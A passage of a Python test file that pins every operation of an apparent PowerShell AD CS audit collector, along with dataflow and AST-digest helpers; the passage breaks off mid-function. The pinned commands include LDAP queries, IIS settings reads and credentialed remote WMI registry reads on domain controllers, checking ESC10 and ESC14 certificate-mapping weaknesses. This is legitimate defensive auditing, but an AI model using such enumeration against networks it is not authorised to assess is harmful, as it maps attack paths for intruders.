            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
        ),
    ),
    (
        "Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name enabled -ErrorAction Stop",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
            "scriptblock of _tryRead",
        ),
    ),
    (
        "_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name 'extendedProtection.tokenChecking' -ErrorAction Stop }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
        ),
    ),
    (
        "Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name 'extendedProtection.tokenChecking' -ErrorAction Stop",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
            "scriptblock of _tryRead",
        ),
    ),
    (
        "_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter 'system.webServer/security/access' -Name sslFlags -ErrorAction Stop }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
        ),
    ),
    (
        "Get-WebConfigurationProperty -PSPath $ps -Filter 'system.webServer/security/access' -Name sslFlags -ErrorAction Stop",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
            "scriptblock of _tryRead",
        ),
    ),
    (
        '_tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter "$auth/providers" -Name Collection -ErrorAction Stop }',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
        ),
    ),
    (
        'Get-WebConfigurationProperty -PSPath $ps -Filter "$auth/providers" -Name Collection -ErrorAction Stop',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
            "scriptblock of _tryRead",
        ),
    ),
    (
        "_list $provs",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
        ),
    ),
    (
        "_epaToken $tc.value.Value",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "try",
            "foreach ($site in (Get-Website -ErrorAction Stop))",
            "foreach ($app in (Get-WebApplication -Site $site.Name -ErrorAction Stop))",
            "guard if (-not $appPath) -> continue",
            "guard if (-not $kind) -> continue",
            "if ($tc.ok) after []",
        ),
    ),
    (
        "Write-Warning $endpointsReason",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
            "catch []",
        ),
    ),
    (
        "Where-Object { $_ }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
        ),
    ),
    (
        "_searchMarker ($endpointsComplete -and -not $endpointScope) $endpointsWhy $webEndpoints.Count $webEndpoints.Count $iisFailures",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $endpointsSkipped) after []",
        ),
    ),
    (
        "_search $domNc '(altSecurityIdentities=*)' @('altsecurityidentities', 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
        ),
    ),
    (
        "_entryProps $e",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
            "foreach ($e in $ps14.entries)",
            "try",
        ),
    ),
    (
        "_requireSchema $p 'principal-mappings'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
            "foreach ($e in $ps14.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'distinguishedname'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
            "foreach ($e in $ps14.entries)",
            "try",
        ),
    ),
    (
        "_guidHex @(_v $p 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
            "foreach ($e in $ps14.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'objectguid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
            "foreach ($e in $ps14.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'altsecurityidentities'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
            "foreach ($e in $ps14.entries)",
            "try",
        ),
    ),
    (
        "ForEach-Object { [string]$_ }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
            "foreach ($e in $ps14.entries)",
            "try",
        ),
    ),
    (
        "_markSearch 'principal-mappings' $ps14 @($ps14.entries).Count $principalMappings.Count $psFailures",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "try",
        ),
    ),
    (
        'Write-Warning "esc14-altsecid failed: $($_.Exception.Message)"',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "catch []",
        ),
    ),
    (
        "New-Object Management.Automation.PSCredential( $DcRegistryUser, (ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force))",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "if ($DcRegistryUser) after []",
        ),
    ),
    (
        "ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "if ($DcRegistryUser) after []",
        ),
    ),
    (
        "_search $domNc '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' @('dnshostname', 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
        ),
    ),
    (
        "_entryProps $e",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
        ),
    ),
    (
        "_requireSchema $p 'dc-config'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'dnshostname'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
        ),
    ),
    (
        "_guidHex @(_v $p 'objectguid')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'objectguid'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
        ),
    ),
    (
        "_v $p 'distinguishedname'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "if ($check.soft -contains 'dnshostname') after []",
        ),
    ),
    (
        'Write-Warning "esc10-dc-registry: $dcDns has no dNSHostName; its registry was not read"',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "if ($check.soft -contains 'dnshostname') after []",
        ),
    ),
    (
        "Get-WmiObject -Namespace 'root\\default' -Class StdRegProv -List",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
            "if ($dcDns.ToLower() -eq $localHost -or $dcDns.ToLower().StartsWith($localHost + '.')) after []",
        ),
    ),
    (
        "Get-WmiObject -ComputerName $dcDns -Credential $dcCred -Namespace 'root\\default' -Class StdRegProv -List",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
            "if ($dcCred) after [($dcDns.ToLower() -eq $localHost -or $dcDns.ToLower().StartsWith($localHost + '.'))]",
        ),
    ),
    (
        "Get-WmiObject -ComputerName $dcDns -Namespace 'root\\default' -Class StdRegProv -List",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
            "else of [($dcDns.ToLower() -eq $localHost -or $dcDns.ToLower().StartsWith($localHost + '.')) ; ($dcCred)]",
        ),
    ),
    (
        "_wmiDwordStatus $kdc",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
            "switch (_wmiDwordStatus $kdc)",
        ),
    ),
    (
        "_decodeBinding ([int]$kdc.uValue)",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
            "switch (_wmiDwordStatus $kdc)",
        ),
    ),
    (
        "_wmiDwordStatus $sch",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
            "switch (_wmiDwordStatus $sch)",
        ),
    ),
    (
        "_decode ([int]$sch.uValue) $SCHANNEL_BITS",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
            "switch (_wmiDwordStatus $sch)",
        ),
    ),
    (
        'Write-Warning "esc10-dc-registry $dcDns failed: $($_.Exception.Message)"',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "catch []",
        ),
    ),
    (
        "_list $schannelMethods",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
        ),
    ),
    (
        "Where-Object { $null -eq $_.strong_certificate_binding_enforcement }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
        ),
    ),
    (
        'Write-Warning "esc10-dc-registry: all $($dcConfigs.Count) DC(s) failed the registry read -- pass effectively skipped (WMI access denied? provide -DcRegistryUserB64/-DcRegistryPassB64 for SSH/double-hop)."',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "if ($dcConfigs.Count -gt 0 -and $wmiFailures -eq $dcConfigs.Count) after []",
        ),
    ),
    (
        "_markSearch 'dc-config' $dcs @($dcs.entries).Count $dcConfigs.Count $dcFailures",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "else of [($dcConfigs.Count -gt 0 -and $wmiFailures -eq $dcConfigs.Count)]",
        ),
    ),
    (
        "Get-Date",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "hostname",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson @($caConfig) 'ca-config.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson @($templates) 'templates.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson @($oids) 'oid-objects.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson @($pkiAcls) 'pki-acls.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson @($webEndpoints) 'web-endpoints.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson @($dcConfigs) 'dc-config.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson @($principalMappings) 'principal-mappings.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson $enrollmentServices 'enrollment-services.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson $caSecurity 'ca-security.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_writeJson ([ordered]@{ certs = @($certIndex); crls = @($crlIndex) }) 'certs/index.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if (-not $certsSkipped) after []",
        ),
    ),
    (
        "_writeJson $manifest 'collector-manifest.json'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "Write-Output (\"OK cas={0} templates={1} oids={2} pkiacls={3} endpoints={4} dcs={5} altsecid={6} certs={7} crls={8} editflags=[{9}] ca={10}\" -f ` $caConfig.Count, $templates.Count, $oids.Count, $pkiAcls.Count, $webEndpoints.Count, $dcConfigs.Count, $principalMappings.Count, $certIndex.Count, $crlIndex.Count, ((@($editFlags) | Where-Object { $_ }) -join ','), $caCommonName)",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "Where-Object { $_ }",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "[IO.File]::WriteAllText($outPath, $script:JS.Serialize($obj), (New-Object Text.UTF8Encoding($false)))",
        (
            "function _writeJson",
            "guard Assert-AdcsOutputPath $outParent",
            "guard Assert-AdcsOutputPath $outPath",
        ),
    ),
    ("$conn.Bind()", ("function _ldapConnection", "guard if ($script:LdapConn) -> return")),
    ("$conn.SendRequest($req)", ("function _search", "scriptblock in InvokeMemberExpressionAst")),
    (
        '[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\$caName")',
        ("function _caSecurityRead", "scriptblock of _tryRead"),
    ),
    (
        "[IO.File]::WriteAllBytes((Join-Path $certDir $certFile), $der)",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $aia.entries)",
            "try",
            "foreach ($r in $rows)",
            "guard Assert-AdcsOutputPath (Join-Path $certDir $certFile)",
        ),
    ),
    (
        "[IO.File]::WriteAllBytes((Join-Path $certDir $crlFile), $der)",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "try",
            "guard Assert-AdcsOutputPath $certDir",
            "foreach ($e in $cdp.entries)",
            "try",
            "guard if (-not @(_v $p 'certificaterevocationlist').Count) -> continue",
            "guard Assert-AdcsOutputPath (Join-Path $certDir $crlFile)",
        ),
    ),
    (
        "$reg.GetDWORDValue($HKLM, 'SYSTEM\\CurrentControlSet\\Services\\Kdc', 'StrongCertificateBindingEnforcement')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
        ),
    ),
    (
        "$reg.GetDWORDValue($HKLM, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL', 'CertificateMappingMethods')",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "if ($CollectDcMapping) after []",
            "foreach ($e in $dcs.entries)",
            "try",
            "else of [($check.soft -contains 'dnshostname')]",
            "try",
        ),
    ),
)


# --- dataflow helpers ---------------------------------------------------------------

_VARIABLE = re.compile(r"\$(?:\{([^}]+)\}|((?:[A-Za-z_][A-Za-z0-9_]*:)?[A-Za-z_][A-Za-z0-9_]*))")
_SCOPE_PREFIXES = ("script:", "local:", "private:", "global:", "variable:", "using:")


def _bare_var(name: str) -> str:
    low = name.lower()
    for prefix in _SCOPE_PREFIXES:
        if low.startswith(prefix):
            return low[len(prefix) :]
    return low


def _vars_in(text: str | None) -> set[str]:
    return {_bare_var(a or b) for a, b in _VARIABLE.findall(text or "")}


# A variable's bindings are keyed per SCOPE ("<scope>::<name>"), so the same
# name in two scopes is two separate pins (e.g. $s declared as _b64's parameter
# is distinct from the DirectorySearcher $s assigned in the script). A binding
# is (kind, value); the kinds are listed in _bindings_by_var.
Binding = tuple[str, str]


def _skey(scope: str, name: str) -> str:
    return f"{scope}::{name}"


def _bindings_by_var(dump: dict[str, Any]) -> dict[str, list[Binding]]:
    """Every way each (scope, variable) acquires a value, as (kind, value):

    ``assign <Op>`` (any operator; value = right-hand side), ``incdec <Token>``,
    ``foreach`` (value = source), ``parameter`` (value = the whole declaration:
    attributes, type, default), ``arg`` / ``splat`` (a call-site argument of a
    local function; the scope is the callee, where the parameter lives), and
    ``member <Op>`` / ``index <Op>`` (a property / index write on the variable's
    object; value = ``target = rhs``). Names are lower-cased with any scope
    qualifier stripped. ``$null = ...`` discards output and binds nothing.
    """
    out: dict[str, list[Binding]] = {}
    for b in dump["bindings"]:
        name = b["variable"]
        if name is None or b["kind"] == "common-parameter":
            continue
        if name == "null" and b["kind"] == "assign Equals":
            continue
        out.setdefault(_skey(b["scope"], name), []).append((b["kind"], b["value"]))
    for m in dump["member_assignments"]:
        if m["receiver_root"]:
            out.setdefault(_skey(m["scope"], m["receiver_root"]), []).append(
                (f"{m['kind']} {m['operator']}", f"{m['target']} = {m['value']}")
            )
    return out


# PowerShell resolves command, function, method and parameter names case
# insensitively, so every comparison against a fixed name goes through a
# lower-cased mirror. `_cf` is the one canonicalization point; the case
# meta-test (test_verdict_is_case_insensitive) re-runs every APPEND-style
# regression snippet with its names' casing flipped and requires identical
# verdicts. Replacement / multi-edit probes are not name-swapped; they rely on
# the same single canonicalization point.
def _cf(name: str | None) -> str:
    return (name or "").lower()


_ALLOWED_COMMANDS_CF = {k.lower(): v for k, v in ALLOWED_COMMANDS.items()}
_ALLOWED_INSTANCE_CF = {k.lower(): v for k, v in ALLOWED_INSTANCE.items()}
_ALLOWED_STATIC_CF = {(t.lower(), m.lower()) for t, m in ALLOWED_STATIC}
_ALLOWED_WRITE_TARGETS_CF = {k.lower(): v for k, v in ALLOWED_WRITE_TARGETS.items()}
_FORBIDDEN_COMMANDS_CF = {c.lower() for c in FORBIDDEN_COMMANDS}
_GUARDED_COMMANDS_CF = {c.lower() for c in _GUARDED_COMMANDS}
_GUARDED_STATIC_CF = {(t.lower(), m.lower()) for t, m in _GUARDED_STATIC}
_GUARDED_INSTANCE_CF = {m.lower() for m in _GUARDED_INSTANCE}
_INSTANCE_RECEIVERS_CF = {k.lower(): v for k, v in INSTANCE_RECEIVERS.items()}


def _member_call_key(m: dict[str, Any]) -> tuple[str, ...]:
    return (_canon(m["target"]), _cf(m["member"]), *(_canon(a) for a in m["args"]))


def _guarded(dump: dict[str, Any]) -> list[tuple[str, dict[str, Any], list[str]]]:
    """(name, entry, input texts) for every pinned operation: EVERY command
    invocation (its exact text, count and control-flow context are pinned in
    GUARDED_OPS, whatever the command), plus the write/exec/remote/lifetime .NET
    calls. Inputs are every argument (and the invoked variable of a dynamic
    call): each variable in them is binding-pinned."""
    found: list[tuple[str, dict[str, Any], list[str]]] = []
    for c in dump["commands"]:
        inputs = [e["text"] for e in c["elements"]]
        if not c["name"] or not c["bareword"]:
            inputs = [c.get("head", ""), *inputs]
        found.append((c["name"] or c.get("head", ""), c, inputs))
    for m in dump["members"]:
        if m["static"]:
            if (_cf(m["target"]), _cf(m["member"])) not in _GUARDED_STATIC_CF:
                continue
        elif _cf(m["member"]) not in _GUARDED_INSTANCE_CF:
            continue
        found.append((m["member"], m, list(m["args"])))
    return found


def _guarded_ops(dump: dict[str, Any]) -> list[tuple[str, tuple[str, ...]]]:
    return [(entry["text"], tuple(entry["context"])) for _, entry, _ in _guarded(dump)]


def _resolve(bindings: dict[str, list[Binding]], name: str, scope: str) -> set[str]:
    """The binding key(s) a reference to $name in *scope* resolves to.

    PowerShell resolves dynamically: a name bound in the current scope wins,
    else the script (enclosing) scope. When neither is bound we do not know
    which scope applies, so every scope that binds the name is required (the
    safe over-approximation). A nested scope (``<scope>/{}``) falls back to its
    function/script parent before the script.
    """
    if _skey(scope, name) in bindings:
        return {_skey(scope, name)}
    parent = scope.rsplit("/", 1)[0] if scope.endswith("/{}") else scope
    if parent != scope and _skey(parent, name) in bindings:
        return {_skey(parent, name)}
    if _skey("<script>", name) in bindings:
        return {_skey("<script>", name)}
    hits = {k for k in bindings if k.split("::", 1)[1] == name}
    return hits


_LOCAL_CALL = re.compile(r"(?<![\w$.-])(_[A-Za-z][A-Za-z0-9]*)")


def _required_vars(dump: dict[str, Any]) -> dict[str, str]:
    """(scope, variable) keys whose every binding must be pinned, with the first
    reason. Roots: write/exec/load/remote-operation inputs, receivers of every
    instance call and property / index write, each resolved in the operation's
    own scope; then the closure: every variable read by any binding of a
    required key, and the parameters of any local function such a binding calls.
    """
    bindings = _bindings_by_var(dump)
    params = {f["name"].lower(): (f["name"], f["params"]) for f in dump["function_params"]}
    reasons: dict[str, str] = {}
    pending: list[str] = []

    def need(name: str | None, scope: str, why: str) -> None:
        if not name:
            return
        for key in _resolve(bindings, name, scope):
            if key not in reasons:
                reasons[key] = why
                pending.append(key)

    for name, entry, inputs in _guarded(dump):
        for text in inputs:
            for var in sorted(_vars_in(text)):
                need(var, entry["scope"], f"input of {name}: {entry['text']}")
    for m in dump["members"]:
        if not m["static"]:
            need(m["receiver_root"], m["scope"], f"receiver of .{m['member']}()")
        # Every .NET call is pinned (PINNED_MEMBER_CALLS): its arguments' variables too.
        for text in m["args"]:
            for var in sorted(_vars_in(text)):
                need(var, m["scope"], f"argument of .{m['member']}(): {m['text']}")
    for cond in dump.get("conditions", []):
        for var in sorted(_vars_in(cond["text"])):
            need(var, cond["scope"], f"condition {cond['text']}")
    for m in dump["member_assignments"]:
        need(m["receiver_root"], m["scope"], f"{m['kind']} write {m['target']}")
    while pending:
        key = pending.pop()
        scope = key.split("::", 1)[0]
        for _kind, value in sorted(bindings.get(key, [])):
            for ref in sorted(_vars_in(value)):
                need(ref, scope, f"read by a binding of ${key}")
            # A binding that calls a local function also depends on that
            # function's parameters (its body is pinned separately, below).
            for fn in _LOCAL_CALL.findall(value):
                real_name, fn_params = params.get(fn.lower(), (fn, []))
                for param in fn_params:
                    need(param, real_name, f"parameter of {fn}, called by a binding of ${key}")
    return {k: why for k, why in reasons.items() if k.split("::", 1)[1] not in _AUTO_READ_OK}


# Exact per-function body pins: the normalized-AST digest of each local
# function's whole subtree (its name and every node with every property, in
# source order). A change to any helper body — its emitted/return value, a
# constant, a reordered statement — changes its digest and fails
# test_collector_body_pins, so it needs a deliberate edit of this table on TOP
# of regenerating the golden. The regeneration script never writes this table
# (test_regen_does_not_touch_pin_tables), so a helper-body change cannot be
# laundered by a regenerate. Comments/whitespace are covered by the golden
# source digest, not here.
def _row_index_paths(rows: list[list[Any]]) -> list[tuple[int, ...]]:
    """Pre-order child-index path of every AST row (a stable structural id)."""
    paths: list[tuple[int, ...]] = []
    path: list[int] = []
    for row in rows:
        d = int(row[0])
        if d == len(path):
            path.append(0)
        else:
            path = path[: d + 1]
            path[d] += 1
        paths.append(tuple(path))
    return paths


def _subtree_digest(rows: list[list[Any]], i: int) -> str:
